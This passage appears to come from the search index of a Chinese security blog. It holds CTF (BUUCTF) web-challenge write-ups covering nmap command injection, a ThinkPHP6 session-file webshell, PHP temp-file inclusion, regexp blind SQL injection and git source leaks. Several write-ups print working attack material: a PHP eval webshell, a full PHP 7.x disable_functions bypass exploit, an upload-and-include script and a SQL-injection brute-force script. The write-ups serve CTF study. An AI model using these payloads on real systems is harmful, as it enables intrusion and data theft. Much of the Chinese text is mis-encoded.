å¤§å¤§çš„å¯„å†™åœ¨æˆ‘è„¸ä¸Š \n","tags":["å‘½ä»¤æ‰§è¡Œ"],"categories":["å„èµ›äº‹WP"]},{"title":"buuctf-52-[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap","url":"/post/c93f1585.html","content":"\n[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap\n\n<!--more-->\n\nçœ‹é¢˜ç›®æ˜¯ä¸€é“å…³äºnmapçš„é¢˜ç›®\n\nè¯•è¯•127.0.0.1\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923110212-7b3277b4-e3a8-4ddc-a6d3-2029a20ecad2.png)\n\nå†æ¥è¯•è¯•æˆ‘æœ¬åœ°kaliçš„nmap\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923143566-65b6630b-bc38-4280-a492-155645429f5a.png)\n\nå‡ ä¹æ˜¯ä¸€æ ·çš„ ä¼°è®¡å°±åªæ˜¯æ”¾äº†ä¸ªæ¥å£\n\n nmap å‘½ä»¤å¯ä»¥å°†æ‰«æç»“æœä¿å­˜åœ¨æ–‡ä»¶é‡Œé¢ \n\nå°±å¯ä»¥æƒ³åˆ°å†™ä¸€å¥è¯æœ¨é©¬ è¿™é‡Œå±è”½äº†php å¹¶ä¸” escapeshellarg()ä¸escapeshellcmd()å‡½æ•°å¤„ç†ä¿æŠ¤  ä¸ä¹‹å‰åšçš„æœ‰é“é¢˜ç›®å¾ˆç›¸ä¼¼\n\nå¯ä»¥ç”¨ç©ºæ ¼ä¸å•å¼•å·ç»•è¿‡\n\né€‰é¡¹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923628955-36f85d37-609e-4bee-b23f-63ef33cd4b38.png)\n\næœ€ç»ˆpayloadï¼š\n\n```\n' <?= @eval($_POST[1]);?> -oG a.phtml '\n```\n\nä¹‹årceå°±è¡Œäº†\n","tags":["nmap","esc***å‡½æ•°"],"categories":["buuctf"]},{"title":"buuctf-96-[GYCTF2020]EasyThinking","url":"/post/db3afe26.html","content":"\n[GYCTF2020]EasyThinking\n\n<!--more-->\n\nçœ‹æ ‡é¢˜æ˜¯ä¸€ä¸ªå…³äºthinkphpçš„æ¼æ´\n\nå…ˆéšä¾¿ä¹±è¾“ï¼Œå‘ç°æ˜¯thinkphp6\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050340127-2a4df26d-b7ea-4d7b-8d00-1b8d918cdfa7.png)\n\nä¸Šç½‘æŸ¥ä¸€ä¸‹æ¼æ´ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶åˆ›å»ºæ¼æ´ ï¼ˆå‚è€ƒï¼šhttps://www.anquanke.com/post/id/257485#h3-3ï¼‰\n\nå…ˆæ³¨å†Œä¸€ä¸ªè´¦å· ç„¶åç™»å½•æŠ“åŒ… ä¿®æ”¹phpsessidè¿™é‡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050525889-201d9ede-14f7-40f0-838c-a802991c0e86.png)\n\nè¿™é‡Œå¯ä»¥éšä¾¿è¾“å…¥ï¼Œç„¶åä¼šåœ¨`/runtime/session/sess_åˆšåˆšè¾“å…¥çš„32å­—ç¬¦`ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ \n\nè¿™é‡Œä¹‹åæˆ‘ä»¬è¦è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥æœ€å¥½å°†å­—ç¬¦ä¸²è®¾ä¸ºå¸¦æœ‰phpåç¼€çš„æ–‡ä»¶\n\nç„¶ååœ¨æœç´¢è¿™é‡Œä¸Šä¼ æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050675837-fd4031ba-50f3-45b9-a53e-bc98875871ee.png)\n\nèšå‰‘è¿æ¥ `http://7f188c29-b095-4cdc-8aad-37aa4b61403f.node4.buuoj.cn:81/runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php`\n\ngetshellä¹‹åå‘ç°è¯»ä¸äº†flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681050780538-11589c45-5e9d-4046-a790-d8377818edb7.png)\n\næŸ¥çœ‹phpinfo()ä¹‹åå‘ç°ç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ï¼Œåšåˆ°è¿™é‡Œå’Œä¹‹å‰buuæœ‰é“é¢˜ç›®å¾ˆåƒï¼Œæœ‰ä¸¤ç§åšæ³•\n\n## ç¬¬ä¸€ç§è§£æ³• èšå‰‘æ’ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051090942-b7882cf9-e5b3-44fe-b624-0506cf666fd1.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051116541-e04d75d7-5362-4bf1-8644-0e3123f7ce13.png)\n\n## ç¬¬äºŒç§è§£æ³•  ä¸Šä¼ ä¸€ä¸ªç»•è¿‡disable_functionsçš„è„šæœ¬  \n\nexpï¼š7.3çš„ç‰ˆæœ¬ è¿™é‡Œè¦æ³¨æ„phpç‰ˆæœ¬ ä¸åŒç‰ˆæœ¬å¯¹åº”çš„è„šæœ¬ä¸åŒ\n\n```php\n<?php\n\n# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=72530\n#\n# This exploit should work on all PHP 7.0-7.3 versions\n#\n# Author: https://github.com/mm0r1\n\npwn(\"/readflag\");\n\nfunction pwn($cmd) {\n    global $abc, $helper;\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    class ryat {\n        var $ryat;\n        var $chtg;\n\n        function __destruct()\n        {\n            $this->chtg = $this->ryat;\n            $this->ryat = 1;\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if you get segfaults\n\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_repeat('A', 79);\n\n    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}';\n    $out = unserialize($poc);\n    gc_collect_cycles();\n\n    $v = [];\n    $v[0] = ptr2str(0, 79);\n    unset($v);\n    $abc = $out[2][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n\n    exit();\n}\n```\n\nå°†è¿™ä¸ªè„šæœ¬ä¸Šä¼ ä¸Šå» è¿™é‡Œæœ€å¥½æ˜¯åˆ° /var/tmp  æˆ–è€… /tmp è¿™ä¸¤ä¸ªè·¯å¾„æ˜¯ç”¨æˆ·ç”¨äºå­˜å‚¨ä¸´æ—¶æ€§çš„æ–‡ä»¶ï¼Œäº¦ç»å¸¸è¢«ç¨‹åºè¯»å†™ç”¨æˆ·å­˜å‚¨ä¸´æ—¶æ€§æ•°æ®ï¼Œæœ¬è´¨ä¸Šæ²¡åŒºåˆ«ï¼Œæ—¢ç„¶æ˜¯ç”¨æˆ·å­˜å‚¨ä¸´æ—¶æ€§æ•°æ®ï¼Œæˆ‘ä»¬ä¸€èˆ¬æ˜¯æœ‰å†™æ–‡ä»¶æƒé™çš„ã€‚ \n\nå¯ä»¥åœ¨æˆ‘çš„centos7ä¸Šçœ‹çœ‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051771351-a93986bf-01f1-43c9-a09d-e42c37133783.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051825293-1ea88dd7-710f-4876-9de0-95c867ad2022.png)\n\nå¯ä»¥çœ‹åˆ°è¿™ä¸¤ç§è·¯å¾„çš„é»˜è®¤æƒé™æ˜¯777\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051303740-0e86adff-6bd1-4558-a103-ad3614348457.png)\n\nä¸Šä¼ æˆåŠŸ ä¹‹åå†å»åŒ…å«ä»–\n\næˆåŠŸ~\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051469402-699b9232-eb82-451c-8e15-007bc3886685.png)\n","tags":["bypass","thinkphp"],"categories":["buuctf"]},{"title":"buuctf-91-[NPUCTF2020]ezinclude","url":"/post/da0771e5.html","content":"\n[NPUCTF2020]ezinclude\n\n<!--more-->\n\nä¸€é“phpæ–‡ä»¶ä¸´æ—¶åŒ…å«çš„é¢˜ç›®ï¼Œä¹‹å‰æ²¡è§è¿‡\n\nè¿›å…¥ä¹‹å æ ¹æ®æç¤º ç»™passä¼ ä¸€ä¸ªhashå€¼ å¯ä»¥æŠ“åŒ…çœ‹åˆ°\n\nç„¶åç›´æ¥åœ¨bpé‡Œæ“ä½œå°±è¡Œï¼Œä¸ç„¶ç½‘é¡µä¼šæŒ‘æˆ˜åˆ°ä¸€ä¸ª404ç½‘é¡µ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137425602-9e43ff11-ea0a-4d35-9bc4-e4b30806e036.png)\n\nå­˜åœ¨æ–‡ä»¶åŒ…å«\n\nä¸€èˆ¬è¿™ç§flagæ–‡ä»¶åç§°ä¼šè¢«æ”¹å†™æˆå¥‡å¥‡æ€ªæ€ªçš„å½¢å¼ï¼Œé çŒœæ˜¯çŒœä¸åˆ°çš„\n\nè¯»ä¸€ä¸‹å½“å‰é¡µé¢çš„æºç å§ ç”¨ä¸€ä¸‹ä¼ªåè®®\n\næ„é€ payloadï¼š`?file=php://filter/read=convert.base64-encode/resource=flflflflag.php`\n\nå‘ç°data input zipåè®®éƒ½è¢«æ²³èŸ¹äº† æ²¡åŠæ³•ç›´æ¥å‘½ä»¤æ‰§è¡Œ\n\næºç å¦‚ä¸‹\n\n```python\n<html>\n<head>\n<script language=\"javascript\" type=\"text/javascript\">\n           window.location.href=\"404.html\";\n</script>\n<title>this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend</title>\n</head>\n<>\n<body>\n<?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n\tdie('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?>\n</body>\n</html>\n```\n\næ‰«ä¸€ä¸‹ç½‘ç«™ å‘ç°è¿˜æœ‰config.php é‡Œé¢æ˜¯å‡çš„flag è¿˜æœ‰ä¸€ä¸ªdir.php\n\nå†…å®¹å¦‚ä¸‹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137766612-8b1fa82f-df6a-4aa0-89e5-d0945ac1bf4f.png)\n\nå‘ç°è¿™ä¸ªæ–‡ä»¶å¯ä»¥å¸®æˆ‘ä»¬æ‰«/tmpçš„æ–‡ä»¶ç›®å½• è¿™ä¸ªç›®å½•æ˜¯å­˜å‚¨ç”¨æˆ·ä¸´æ—¶æ–‡ä»¶çš„åœ°æ–¹ æˆ‘ä»¬å¯¹ä»–æœ‰å†™æƒé™ \n\nè¿™é‡Œç”¨åˆ°äº† phpä¸´æ—¶æ–‡ä»¶åŒ…å«çš„æ¼æ´ å…·ä½“å‚è€ƒï¼ˆhttps://www.anquanke.com/post/id/201136#h2-11ï¼‰\n\nphp7.0çš„bugï¼š\n\n```\n?file=php://filter/string.strip_tags/resource=/etc/passwd\n```\n\nä½¿ç”¨`php://filter/string.strip_tags`å¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ï¼Œå†è¿›è¡Œæ–‡ä»¶åçˆ†ç ´å°±å¯ä»¥getshell,è¿™ä¸ªå´©æºƒåŸå› æ˜¯å­˜åœ¨ä¸€å¤„ç©ºæŒ‡é’ˆå¼•ç”¨ã€‚\n\nè¯¥æ–¹æ³•ä»…é€‚ç”¨äºä»¥ä¸‹php7ç‰ˆæœ¬ï¼Œphp5å¹¶ä¸å­˜åœ¨è¯¥å´©æºƒã€‚\n\nâ€¢ php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤  \n\nâ€¢ php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤ \n\nâ€¢ php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤\n\nåˆ©ç”¨å¤§ä½¬ç°æˆçš„è„šæœ¬\n\n```python\nimport requests\nfrom io import BytesIO\nurl=\"http://5fd4afee-539c-424e-9b53-31cc89bbddf7.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\npayload=\"<?php phpinfo();?>\"\nfiles={\n    \"file\":BytesIO(payload.encode())\n}\nr=requests.post(url=url,files=files,allow_redirects=False)\n\n\nprint(r.text)\n```\n\nä¹‹åå†å»çœ‹çœ‹dir.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137989466-9f670370-e4b0-47fe-a73d-978c28304509.png)\n\nå‘ç°æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ \n\nå†å»åŒ…å«ä¸€ä¸‹æˆ‘ä»¬çš„æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681138061207-03a37f3f-f1cd-4103-9530-a59e235d7fe0.png)\n","tags":["phpä¸´æ—¶æ–‡ä»¶åŒ…å«"],"categories":["buuctf"]},{"title":"buuctf-90-[NCTF2019]SQLi","url":"/post/4f5e876.html","content":"\n[NCTF2019]SQLi\n\n<!--more-->\n\nsqlæ³¨å…¥ fuzzä¸€ä¸‹å‘ç°å±è”½äº†å¾ˆå¤šçš„sqlå¸¸ç”¨å‘½ä»¤\n\næ‰«æœåŠ¡å™¨åå°å‘ç°hint.txt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681030820273-63312165-e4dd-489c-8d16-4d6a50608be8.png)\n\nä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬è·å¾—adminçš„å¯†ç æ—¶ï¼Œå°±èƒ½è·å¾—flagï¼Œè¿adminéƒ½è¢«é»‘åå•äº†ï¼Œæ˜¾ç„¶æ˜¯ä¸æƒ³è®©æˆ‘ä»¬é€šè¿‡å¸¸ç”¨çš„æ‰‹æ®µå»æ³¨å…¥\n\nå›åˆ°ä¸»é¡µçœ‹åˆ°ä»–å·²ç»ç»™äº†æˆ‘ä»¬ç³»ç»Ÿçš„æŸ¥è¯¢è¯­å¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681030986280-e33b949b-5625-4741-be44-78bb74245b06.png)\n\nè¿™é‡Œæ˜¯ä¸æ˜¯å°±èƒ½æƒ³åˆ°é€šè¿‡å·§å¦™çš„é—­åˆæ”¹å˜æŸ¥è¯¢è¯­å¥ä½¿å¾—æˆ‘ä»¬çš„æ¶æ„æ³¨å…¥è¯­å¥å°±èƒ½è¢«è°ƒç”¨\n\nçœ‹äº†å¤§ä½¬çš„wpå‘ç°æ˜¯æ­£åˆ™æ³¨å…¥ regexp\n\næœ¬åœ°æµ‹è¯•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681031145077-b7064c79-5562-4128-994e-bb74b5ef25a1.png)\n\nèƒ½çœ‹å‡ºæ— è®ºusernameçš„å†…å®¹æ˜¯å¦åœ¨è¿™ä¸ªè¡¨å•ä¸­ï¼Œå› ä¸ºæœ‰`||`ï¼ˆç›¸å½“äºé€»è¾‘æˆ–ï¼‰\n\nå½“`password=\"^1\"`ä¹Ÿå°±æ˜¯ä»¥1å¼€å¤´ ä¹‹åä»¥12å¼€å¤´ï¼Œåˆ©ç”¨è¿™æ ·çš„æ­£åˆ™åŒ¹é…å»ä¸€ä½ä¸€ä½çš„è¯•æ¢ï¼Œæ€è·¯ç±»ä¼¼äºå¸ƒå°”ç›²æ³¨ï¼Œæ ¹æ®å›æ˜¾æ¥åˆ¤æ–­ã€‚\n\nå›åˆ°é¢˜ç›®ï¼Œåº”è¯¥æ€ä¹ˆæ„é€ å‘¢\n\né¢˜ç›®sqlé‡Œçš„æŸ¥è¯¢è¯­å¥ä¸ºï¼š\n\n```\nselect * from users where username='' and passwd=''\n```\n\nå¯ä»¥æ„é€ `username=\\&passwd=||sql;%00`  ç©ºæ ¼è¢«æ²³èŸ¹äº†å¯ä»¥ç”¨`/**/`ç»•è¿‡  æ³¨é‡Šç¬¦`# --`\n\n`%00`æ¥ç»•è¿‡æœ¬è´¨ä¸Šæ˜¯æˆªæ–­ è¿™é‡Œæœ«å°¾çš„å°å·å®é™…ä¸Šæ˜¯sqlè¯­å¥é‡Œçš„\n\nå› ä¸ºå¾ˆå¤šç¨‹åºåº•å±‚éƒ½æ˜¯cè¯­è¨€ç¼–è¯‘çš„ï¼Œcè¯­è¨€å¯¹äºä¸€ä¸ªå­—ç¬¦ä¸²åˆ°æœ«å°¾çš„æ ‡è¯†æ˜¯æ˜¯å¦æ£€æµ‹åˆ°`\\0`ç»è¿‡urlåŠ å¯†åå³ä¸º`%00`\n\næ”¾å…¥åŸè¯­å¥åä¸ºï¼š`select * from users where username='\\' and passwd='||sql;%00'`\n\nç›¸å½“äºusernameä¸­çš„è¯­å¥ä¸º`' and passwd =`å†…å®¹ä¸é‡è¦ ç„¶åé€»è¾‘æˆ– åŠ ä¸Šæˆ‘ä»¬çš„sqlæ³¨å…¥çš„æ¶æ„è¯­å¥\n\n```\nusername=\\&passwd=||/**/passwd/**/regexp/**/\"^{}\";%00\n```\n\nå¦‚æœå›æ˜¾æ­£å¸¸ä¸ºä¼šå®šå‘åˆ°welcome.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681033291490-4106c873-7f0f-4dc4-930a-176e216861db.png)\n\næ ¹æ®æ€è·¯å†™å‡ºè„šæœ¬\n\n```python\nimport requests\nfrom urllib import parse\nimport string\nurl = 'http://16b0c2ee-be28-47f4-8454-b6a04a23aa8f.node4.buuoj.cn:81/index.php'\nresult = ''\ndictionary = string.ascii_lowercase + string.digits + '_' #çˆ†ç ´å­—å…¸\nfor i in range (1,35):\n    for j in dictionary:\n        payload = {\n            \"username\":\"\\\\\",   #è¿™é‡Œéœ€è¦è½¬ä¹‰ä¸€ä¸‹\n            \"passwd\":\"||/**/passwd/**/regexp/**/\\\"^{}\\\";{}\".format((result+j),parse.unquote(\"%00\"))\n        }\n        r = requests.post(url,data=payload)\n        if \"welcome\" in r.text:\n            result+=j\n            break\n    print(result)\n```\n\nè¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼šå¦‚æœåœ¨ç™»å½•æ¡†é‡Œé¢æ•²%00 é‚£æ ·ä¼šå¯¼è‡´%00è¢«è½¬ä¹‰è€Œå¤±å»ä½œç”¨ åœ¨pythonè„šæœ¬é‡Œé¢ æˆ‘ä»¬ç”¨parse.unquote('%00')è¡¨ç¤ºä¸è¿›è¡Œè½¬ä¹‰çš„%00 è¿™æ ·å°±èƒ½çˆ†å‡ºå¯†ç   \n","tags":["sqlæ³¨å…¥","sql bypass","sqlæ­£åˆ™æ³¨å…¥"],"categories":["buuctf"]},{"title":"buuctf-88-[ç½‘é¼æ¯ 2018]Comment","url":"/post/3a0e9ae9.html","content":"\n[ç½‘é¼æ¯ 2018]Comment\n\n<!--more-->\n\nè¿™æ˜¯ä¸€é“å…³äºsqläºŒæ¬¡æ³¨å…¥çš„é¢˜ç›® ç¬¬ä¸€æ¬¡é‡åˆ°äºŒæ¬¡æ³¨å…¥çš„é¢˜ç›®è›®ä¸é”™\n\nè¿›å…¥ä¹‹åï¼Œæ˜¯ä¸€ä¸ªç±»ä¼¼äºç•™è¨€æ¿çš„ç•Œé¢\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456616603-81a091fd-c756-4579-9d71-8352ed648e24.png)\n\néœ€è¦å…ˆç™»å½• ç„¶åå½¢å¼æ˜¯å¯†ç æœ€åä¸‰ä½çº¯æ•°å­—ä¸çŸ¥é“ é€šè¿‡bpçˆ†ç ´ä¸€ä¸‹å°±å‡ºæ¥äº† å¯†ç ç»“å°¾æ˜¯666\n\nè¿›å…¥ä¹‹åf12\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456702395-d52c4662-22f7-4655-af63-fa9d6fc43792.png)\n\nå‘ç°æç¤º å­˜åœ¨gitæºç æ³„éœ²çš„\n\nç›´æ¥ä¸Šgithack\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456816678-f2f3e1ca-7c33-420e-ba91-40677e6f3b1c.png)\n\nå‘ç°æºç \n\n```plain\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    break;\ncase 'comment':\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\nä½†æ˜¯å‘ç°æºç ä¸å…¨ \n\nç”¨`git log`æˆ–è€… `git log --reflog`æ‰¾åˆ°åŸæ¥çš„ä»£ç ç„¶åæ¢å¤\n\nä½†æ˜¯æˆ‘è¿™é‡Œæ²¡æœ‰å¤ç°æˆåŠŸ ä¸€ç›´æŠ¥é”™ æ‰¾äº†å¥½ä¹…æ²¡å‘ç°æ˜¯ä»€ä¹ˆåŸå› \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457000040-68cd4018-9ec3-40a8-b762-b9cc760e35b5.png)\n\næ— æœåªèƒ½å†å»å¯»æ‰¾åˆ«çš„æ–¹æ³•\n\nç„¶åå‘ç°äº†å¦ä¸€ä¸ª æå–è¿œç¨‹ git æ³„éœ²æˆ–æœ¬åœ° git çš„å·¥å…·   git_extract  å¯ä»¥è¯´æ˜¯å¢å¼ºç‰ˆ \n\næºç åœ°å€ï¼šhttps://github.com/gakki429/Git_Extract\n\nè°ƒç”¨çš„æ—¶å€™ è¦ç”¨python2 å› ä¸ºè¿™æ˜¯python2çš„è„šæœ¬\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457176398-212a1e06-efb1-4962-a7ca-4eeb2f93d696.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457212657-afd10c8f-9d96-48ce-8e53-9ce1e4516f90.png)\n\nå‘ç°äº†æ›´æ—©çš„æºç \n\n```plain\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    $category = addslashes($_POST['category']);\n    $title = addslashes($_POST['title']);\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into board\n            set category = '$category',\n                title = '$title',\n                content = '$content'\";\n    $result = mysql_query($sql);\n    header(\"Location: ./index.php\");\n    break;\ncase 'comment':\n    $bo_id = addslashes($_POST['bo_id']);\n    $sql = \"select category from board where id='$bo_id'\";\n    $result = mysql_query($sql);\n    $num = mysql_num_rows($result);\n    if($num>0){\n    $category = mysql_fetch_array($result)['category'];\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n    $result = mysql_query($sql);\n    }\n    header(\"Location: ./comment.php?id=$bo_id\");\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\nåˆ†æï¼š\n\nå­˜åœ¨ä¸¤ä¸ªè¡¨ board å’Œ commet\n\nå¹¶ä¸”  `$sql = \"select category from board where id='$bo_id'\";`å½“æˆ‘ä»¬è¯„è®ºæ—¶å€™è¿˜ä¼šè°ƒç”¨boardè¡¨\n\nå†æ¥çœ‹\n\n```plain\n $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n```\n\n $category,$contentæ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚ä¸”æœ€åæ˜¾ç¤ºçš„æ˜¯contentï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•é—­åˆcontent = '$content'\n\nä¸¾ä¾‹å½“æˆ‘ä»¬å»å‘å¸–è¯­å¥ä¸º\n\n category 